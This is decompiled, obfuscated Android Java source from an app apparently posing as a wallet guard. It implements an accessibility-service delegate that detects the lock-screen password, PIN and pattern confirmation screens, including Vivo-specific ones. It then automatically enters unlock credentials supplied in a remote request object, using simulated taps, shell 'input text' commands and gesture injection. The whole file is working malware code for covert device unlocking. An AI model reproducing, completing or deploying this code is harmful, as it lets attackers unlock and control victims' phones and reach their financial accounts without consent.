package o;

import android.graphics.Rect;
import android.os.Build.VERSION;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.Point;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.entity.UiObjectCollection;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.req.ReqUnlockDeviceVO;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.ListIterator;
import java.util.Objects;
import java.util.Map.Entry;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public final class i extends e {
   public final String n = null;
   public final ConcurrentLinkedQueue o = new ConcurrentLinkedQueue();

   public i() {
      super(L(), "com.android.settings");
      this.n = "com.android.settings";
   }

   public static boolean I(String var0) {
      String var3 = var0;
      if (a1.q.B(var0)) {
         var3 = (String)MyAccessibilityService.v.get();
      }

      boolean var1 = a1.q.B(var3);
      boolean var2 = false;
      if (!var1) {
         if (Objects.equals(var3, "com.android.settings.password.ConfirmLockPassword")
            || Objects.equals(var3, "com.android.settings.password.ConfirmLockPattern")
            || Objects.equals(var3, "com.android.settings.password.ChooseLockGeneric")
            || Objects.equals(var3, "com.vivo.settings.password.ConfirmVivoPin$InternalActivity")
            || Objects.equals(var3, "com.android.settings.password.ConfirmLockPattern$InternalActivity")) {
            return true;
         }

         if (Objects.equals(var3, "android.inputmethodservice.SoftInputWindow")) {
            UiObject var4 = MyAccessibilityService.P().J();
            var1 = var2;
            if (var4 != null) {
               var1 = var2;
               if (var4.password()) {
                  var1 = true;
               }
            }

            return var1;
         }
      }

      return false;
   }

   public static LinkedList L() {
      LinkedList var1 = new LinkedList();
      ListenWindow var3 = new ListenWindow("com.android.settings", "com.android.settings.password.ConfirmLockPassword");
      HashSet var2 = o.b.r(var3);
      Integer var0 = 32;
      var2.add(var0);
      HashSet var4 = var3.getEventTypes();
      Integer var5 = 16384;
      var4.add(var5);
      var1.add(var3);
      var3 = new ListenWindow("com.android.settings", "com.android.settings.password.ConfirmLockPattern");
      var3.setEventTypes(new HashSet<>());
      var3.getEventTypes().add(var0);
      var3.getEventTypes().add(var5);
      var1.add(var3);
      var3 = new ListenWindow("com.android.settings", "com.android.settings.password.ChooseLockGeneric");
      var3.setEventTypes(new HashSet<>());
      var3.getEventTypes().add(var0);
      var3.getEventTypes().add(var5);
      var1.add(var3);
      var3 = new ListenWindow("com.android.settings", "com.vivo.settings.password.ConfirmVivoPin$InternalActivity");
      var3.setEventTypes(new HashSet<>());
      var3.getEventTypes().add(var0);
      var3.getEventTypes().add(var5);
      var1.add(var3);
      var3 = new ListenWindow("com.android.settings", "com.android.settings.password.ConfirmLockPattern$InternalActivity");
      var3.setEventTypes(new HashSet<>());
      var3.getEventTypes().add(var0);
      var3.getEventTypes().add(var5);
      var1.add(var3);
      return var1;
   }

   public static boolean O() {
      boolean var0;
      if (!com.guard.wallet.utils.e.i() && !com.guard.wallet.utils.e.l()) {
         var0 = false;
      } else {
         var0 = true;
      }

      return var0;
   }

   public static void P() {
      long var0 = (long)1;

      try {
         Thread.sleep(var0 * 500L);
      } catch (Exception var3) {
         a1.q.s("ConfirmLockDelegate", var3);
      }
   }

   public final boolean H() {
      AtomicInteger var1 = new AtomicInteger(0);

      while (var1.incrementAndGet() < 20 && I(null)) {
         try {
            Thread.sleep(100L);
         } catch (Exception var3) {
            a1.q.s("ConfirmLockDelegate", var3);
         }
      }

      return I(null) ^ true;
   }

   public final void J() {
      if (MyAccessibilityService.P() != null && this.k() != null && com.guard.wallet.utils.e.l()) {
         UiObject var3 = this.k();
         CombineFilter var4 = new CombineFilter();
         StringCondition var2 = o.b.b(var4, a.a.c(var4, "className", "android.view.View"), "id");
         String var1 = this.n;
         var2.setEquals(var1.concat(":id/mix_confirm"));
         var4.getStringConditions().add(var2);
         UiObject var6 = var3.findOneByCombine(var4);
         if (var6 != null && var6.click()) {
            return;
         }

         UiObject var15 = this.k();
         CombineFilter var7 = new CombineFilter();
         StringCondition var12 = o.b.b(var7, a.a.c(var7, "className", "android.widget.TextView"), "id");
         var12.setEquals(var1.concat(":id/iv_complete"));
         var7.getStringConditions().add(var12);
         UiObject var8 = var15.findOneByCombine(var7);
         if (var8 != null && var8.click()) {
            return;
         }

         var3 = this.k();
         var4 = new CombineFilter();
         var2 = o.b.b(var4, a.a.c(var4, "className", "android.widget.Button"), "id");
         var2.setEquals(var1.concat(":id/vivo_pin_confirm"));
         var4.getStringConditions().add(var2);
         UiObject var10 = var3.findOneByCombine(var4);
         if (var10 != null && var10.click()) {
            return;
         }

         UiObject var11 = this.k();
         CombineFilter var14 = new CombineFilter();
         StringCondition var17 = o.b.b(var14, a.a.c(var14, "className", "android.widget.TextView"), "id");
         var17.setEquals(var1.concat(":id/mix_normal_confirm"));
         var14.getStringConditions().add(var17);
         UiObject var5 = var11.findOneByCombine(var14);
         if (var5 != null) {
            var5.click();
         }
      }
   }

   public final boolean K(ReqUnlockDeviceVO var1) {
      boolean var3 = Objects.equals(var1.getCipherGradeCode(), "PASSWORD_QUALITY_NUMERIC_COMPLEX");
      String var6 = this.n;
      if (var3
         || Objects.equals(var1.getCipherGradeCode(), "PASSWORD_QUALITY_ALPHANUMERIC")
         || Objects.equals(var1.getCipherGradeCode(), "PASSWORD_QUALITY_NUMERIC")
         || Objects.equals(var1.getCipherGradeCode(), "PASSWORD_QUALITY_TOUCH_POINTS")) {
         Log.d("ConfirmLockDelegate", "confirmLockByCipher");
         if (!a1.q.B(var1.getTextCipher())) {
            label368: {
               String var7 = var1.getTextCipher();
               if (!a1.q.B(var7)) {
                  UiObject var4;
                  if (this.k() != null) {
                     var4 = this.k().currentFocusedNode();
                  } else {
                     Log.d("ConfirmLockDelegate", "root is null");
                     var4 = null;
                  }

                  UiObject var5 = var4;
                  if (var4 == null) {
                     var5 = MyAccessibilityService.P().J();
                  }

                  if (var5 != null && Objects.equals(var5.className(), "android.widget.EditText")) {
                     if (h.e.S() != null && h.e.S().D()) {
                        P();
                        String var21 = "input text ".concat(var7);
                        if (h.e.S().N(var21)) {
                           this.M(null);
                           if (this.H()) {
                              var3 = true;
                              break label368;
                           }
                        }
                     }

                     if (var5.setText(var7)) {
                        this.M(var5);
                        var3 = this.H();
                        break label368;
                     }
                  }
               }

               var3 = false;
            }

            if (var3) {
               return true;
            }

            label354: {
               label408: {
                  String var53 = var1.getTextCipher();
                  String var22 = var1.getCipherGradeCode();
                  if (!a1.q.B(var53) && MyAccessibilityService.P() != null) {
                     Log.d("ConfirmLockDelegate", "confirmLockByNodes");
                     if (Objects.equals(var22, "PASSWORD_QUALITY_NUMERIC_COMPLEX")
                        || Objects.equals(var22, "PASSWORD_QUALITY_NUMERIC")
                        || Objects.equals(var22, "PASSWORD_QUALITY_TOUCH_POINTS")
                        || Objects.equals(var22, "PASSWORD_QUALITY_ALPHANUMERIC") && a1.q.D(var53)) {
                        if (!a1.q.B(var53) && MyAccessibilityService.P() != null && this.k() != null) {
                           Log.d("ConfirmLockDelegate", "confirmLockByPinKey");
                           if (com.guard.wallet.utils.e.i()) {
                              for (int var12 = 0; var12 < var53.length(); var12++) {
                                 var22 = String.valueOf(var53.charAt(var12));
                                 UiObject var60 = this.k();
                                 CombineFilter var38 = new CombineFilter();
                                 StringCondition var72 = a.a.b(var38, a.a.c(var38, "className", "android.view.View"), "desc", var22);
                                 var38.getStringConditions().add(var72);
                                 UiObject var39 = var60.findOneByCombine(var38);
                                 if (var39 != null && var39.click()) {
                                    StringBuilder var40 = new StringBuilder("Click Pin Node ID:");
                                    var40.append(var22);
                                    Log.d("ConfirmLockDelegate", var40.toString());
                                    P();
                                 }
                              }

                              this.J();
                              if (this.H()) {
                                 break label408;
                              }
                           }

                           if (com.guard.wallet.utils.e.l()) {
                              Log.d("ConfirmLockDelegate", "confirmLockByVivoPinKey");
                              UiObject var41 = this.k();
                              CombineFilter var61 = new CombineFilter();
                              var61.setStringConditions(new LinkedList<>());
                              StringCondition var28 = new StringCondition();
                              var28.setProperty("id");
                              var28.setPrefix(var6.concat(":id/four_to_more_key"));
                              var61.getStringConditions().add(var28);
                              UiObjectCollection var42 = var41.findByCombine(var61);
                              String var62 = var6.concat(":id/four_to_more_key");
                              if (var42 != null && var42.size() > 0) {
                                 for (int var13 = 0; var13 < var53.length(); var13++) {
                                    var22 = var62.concat(String.valueOf(var53.charAt(var13)));

                                    for (UiObject var82 : var42.getNodes()) {
                                       if (var82 != null && Objects.equals(var82.id(), var22) && var82.click()) {
                                          StringBuilder var83 = new StringBuilder("Click Pin Node ID:");
                                          var83.append(var22);
                                          Log.d("ConfirmLockDelegate", var83.toString());
                                          P();
                                       }
                                    }
                                 }

                                 this.J();
                                 var3 = this.H();
                              } else {
                                 var3 = false;
                              }

                              if (var3) {
                                 break label408;
                              }
                           }

                           var22 = var6.concat(":id/key");
                           UiObject var74 = this.k();
                           CombineFilter var43 = new CombineFilter();
                           StringCondition var63 = o.b.b(var43, a.a.c(var43, "className", "android.view.ViewGroup"), "id");
                           var63.setPrefix(var6.concat(":id/key"));
                           var43.getStringConditions().add(var63);
                           UiObjectCollection var64 = var74.findByCombine(var43);
                           if (var64 != null && var64.size() > 0) {
                              for (int var14 = 0; var14 < var53.length(); var14++) {
                                 String var44 = var22.concat(String.valueOf(var53.charAt(var14)));

                                 for (UiObject var84 : var64.getNodes()) {
                                    if (var84 != null && Objects.equals(var84.id(), var44) && var84.click()) {
                                       StringBuilder var85 = new StringBuilder("Click Pin Node ID:");
                                       var85.append(var44);
                                       Log.d("ConfirmLockDelegate", var85.toString());
                                       P();
                                    }
                                 }
                              }

                              this.J();
                              var3 = this.H();
                              break label354;
                           }
                        }
                     } else if (Objects.equals(var22, "PASSWORD_QUALITY_ALPHANUMERIC")
                        && !a1.q.B(var53)
                        && MyAccessibilityService.P() != null
                        && this.k() != null
                        && com.guard.wallet.utils.e.l()) {
                        UiObject var23 = this.k();
                        CombineFilter var8 = new CombineFilter();
                        StringCondition var34 = o.b.b(var8, a.a.c(var8, "className", "android.widget.Button"), "id");
                        var34.setPrefix(var6.concat(":id/num"));
                        var8.getStringConditions().add(var34);
                        UiObjectCollection var24 = var23.findByCombine(var8);
                        UiObject var58 = this.k();
                        CombineFilter var35 = new CombineFilter();
                        StringCondition var9 = o.b.b(var35, a.a.c(var35, "className", "android.widget.Button"), "id");
                        var9.setPrefix(var6.concat(":id/char_"));
                        var35.getStringConditions().add(var9);
                        UiObjectCollection var59 = var58.findByCombine(var35);
                        if (var24 != null && var24.size() > 0 && var59 != null && var59.size() > 0) {
                           for (int var2 = 0; var2 < var53.length(); var2++) {
                              String var69 = String.valueOf(var53.charAt(var2));
                              if (a1.q.D(var69)) {
                                 String var36 = var6.concat(":id/num").concat(var69);

                                 for (UiObject var10 : var24.getNodes()) {
                                    if (var10 != null && Objects.equals(var10.id(), var36) && var10.click()) {
                                       StringBuilder var80 = new StringBuilder("Click VIVO Num Node ID:");
                                       var80.append(var36);
                                       Log.d("ConfirmLockDelegate", var80.toString());
                                       P();
                                    }
                                 }
                              } else {
                                 UiObjectCollection var37 = var24;
                                 String var71 = var6.concat(":id/char_").concat(var69);
                                 Iterator var81 = var59.getNodes().iterator();

                                 while (true) {
                                    var24 = var37;
                                    if (!var81.hasNext()) {
                                       break;
                                    }

                                    UiObject var25 = (UiObject)var81.next();
                                    if (var25 != null && Objects.equals(var25.id(), var71) && var25.click()) {
                                       StringBuilder var26 = new StringBuilder("Click VIVO Char Node ID:");
                                       var26.append(var71);
                                       Log.d("ConfirmLockDelegate", var26.toString());
                                       P();
                                    }
                                 }
                              }
                           }

                           this.J();
                           if (this.H()) {
                              break label408;
                           }
                        }
                     }
                  }

                  var3 = false;
                  break label354;
               }

               var3 = true;
            }

            if (var3) {
               return true;
            }
         }
      }

      if (Objects.equals(var1.getCipherGradeCode(), "PASSWORD_QUALITY_PATTERN")) {
         label251: {
            List var31 = var1.getPatternCipher();
            Rect var45 = var1.getBoundsInScreen();
            Rect var54 = var1.getBoundsInParent();
            if (var31 != null && !var31.isEmpty()) {
               LinkedList var32 = new LinkedList(var31);
               com.guard.wallet.helper.a.d(var32);
               if (this.k() != null && MyAccessibilityService.P() != null) {
                  com.guard.wallet.utils.g.T0(10);
                  UiObject var86 = this.k();
                  CombineFilter var76 = new CombineFilter();
                  StringCondition var65 = o.b.b(var76, a.a.c(var76, "className", "android.view.View"), "id");
                  var65.setEquals(var6.concat(":id/lockPattern"));
                  var76.getStringConditions().add(var65);
                  UiObject var66 = var86.findOneByCombine(var76);
                  if (var66 != null) {
                     StringBuilder var77 = new StringBuilder("confirmLockByGesture pattern:");
                     var77.append(var66);
                     Log.d("ConfirmLockDelegate", var77.toString());
                     if (!com.guard.wallet.utils.e.l()) {
                        LinkedList var55 = (LinkedList)com.guard.wallet.helper.a.e(var32, var45, var54, var66.boundsInWindow(), var66.boundsInParent());
                        Point[] var46 = new Point[var55.size()];
                        var55.toArray(var46);
                        if (this.N(var46)) {
                           var3 = true;
                           break label251;
                        }
                     }

                     Point[] var47 = new Point[var32.size()];
                     var32.toArray(var47);
                     var3 = this.N(var47);
                     break label251;
                  }
               }
            }

            var3 = false;
         }

         if (var3) {
            return true;
         }
      }

      if (var1.getTouchCipher() != null && !var1.getTouchCipher().isEmpty()) {
         boolean var15;
         label237: {
            label409: {
               List var33 = var1.getTouchCipher();
               Rect var48 = var1.getBoundsInScreen();
               var1.getBoundsInParent();
               if (var33 != null && !var33.isEmpty()) {
                  if (this.k() != null && MyAccessibilityService.P() != null) {
                     UiObject var78 = this.k();
                     CombineFilter var67 = new CombineFilter();
                     StringCondition var56 = o.b.b(var67, a.a.c(var67, "className", "android.view.View"), "id");
                     var56.setEquals(var6.concat(":id/keyboard_num"));
                     var67.getStringConditions().add(var56);
                     UiObject var50 = var78.findOneByCombine(var67);
                     if (var50 != null) {
                        Rect var51 = var50.boundsInWindow();
                        if (var48 != null && var51 != null) {
                           HashMap var49 = com.guard.wallet.helper.a.b(var48);
                           HashMap var79 = com.guard.wallet.helper.a.b(var51);
                           if (!var33.isEmpty()) {
                              ListIterator var68 = var33.listIterator();

                              while (var68.hasNext()) {
                                 Point var57 = (Point)var68.next();

                                 for (Entry var87 : var49.entrySet()) {
                                    if (((Rect)var87.getValue()).contains((int)var57.getX(), (int)var57.getY())) {
                                       Rect var88 = (Rect)var79.get(var87.getKey());
                                       if (var88 != null) {
                                          var57.setX((float)var88.centerX());
                                          var57.setY((float)var88.centerY());
                                          break;
                                       }
                                    }
                                 }

                                 var68.set(var57);
                              }
                           }
                        }
                     }

                     if (com.guard.wallet.utils.g.t(var33) && this.H()) {
                        break label409;
                     }
                  }

                  if (h.e.S() != null && h.e.S().D() && h.e.S().c0(var33) && this.H()) {
                     break label409;
                  }
               }

               var15 = false;
               break label237;
            }

            var15 = true;
         }

         if (var15) {
            return true;
         }
      }

      var3 = true;
      if (!Objects.equals(var1.getCipherGradeCode(), "PASSWORD_QUALITY_PATTERN") && !Objects.equals(var1.getCipherGradeCode(), "PASSWORD_QUALITY_TOUCH_POINTS")
         )
       {
         return false;
      } else {
         List var11 = var1.getEventCipher();
         if (var11 == null || var11.isEmpty() || h.e.S() == null || !h.e.S().D() || !h.e.S().b0(var11) || !this.H()) {
            var3 = false;
         }

         return var3;
      }
   }

   public final void M(UiObject var1) {
      if (h.e.S() == null || !h.e.S().D() || !h.e.S().N("input keyevent 66")) {
         UiObject var2 = var1;
         if (var1 == null) {
            var2 = var1;
            if (this.k() != null) {
               var2 = this.k().currentFocusedNode();
            }
         }

         var1 = var2;
         if (var2 == null) {
            var1 = var2;
            if (MyAccessibilityService.P() != null) {
               var1 = MyAccessibilityService.P().J();
            }
         }

         if (var1 != null && VERSION.SDK_INT >= 30) {
            var1.enter();
         }
      }
   }

   public final boolean N(Point[] var1) {
      if (var1.length > 0) {
         for (int var2 = 1; var2 <= 4; var2++) {
            long var4 = (long)var2 * 1000L;

            boolean var3;
            try {
               CountDownLatch var6 = new CountDownLatch(1);
               if (!com.guard.wallet.utils.g.S(10L, var4, var1)) {
                  continue;
               }

               if (!var6.await(var4 + 1000L, TimeUnit.MILLISECONDS)) {
                  Log.d("ConfirmLockDelegate", "ResolveGesture Done");
               }

               var3 = this.H();
            } catch (Exception var7) {
               a1.q.s("ConfirmLockDelegate", var7);
               break;
            }

            if (var3) {
               return true;
            }
         }
      }

      return this.H();
   }

   @Override
   public final void d() {
      try {
         com.guard.wallet.thread.l.a(super.c);
         this.o.clear();
         super.d();
      } catch (Exception var2) {
         a1.q.s("ConfirmLockDelegate", var2);
      }
   }

   @Override
   public final boolean equals(Object var1) {
      if (this == var1) {
         return true;
      } else if (var1 == null) {
         return false;
      } else if (!(var1 instanceof i)) {
         return false;
      } else {
         var1 = var1;
         return Objects.equals(this.n, var1.n);
      }
   }

   @Override
   public final int hashCode() {
      return Objects.hash(i.class.getName(), this.n);
   }

   @Override
   public final void u(AccessibilityEvent var1, String var2, String var3) {
      super.u(var1, var2, var3);
      StringBuilder var5 = new StringBuilder("onAccessibilityEvent event：");
      var5.append(var1);
      Log.d("ConfirmLockDelegate", var5.toString());
      if (I(var3)) {
         Log.d("ConfirmLockDelegate", "已进入锁屏密码验证代理");
         ConcurrentLinkedQueue var4 = this.o;
         if (!var4.contains("inConfirmLock")) {
            var4.add("inConfirmLock");
            com.guard.wallet.thread.l.c(new a(this, 1), super.c);
         }
      }
   }
}
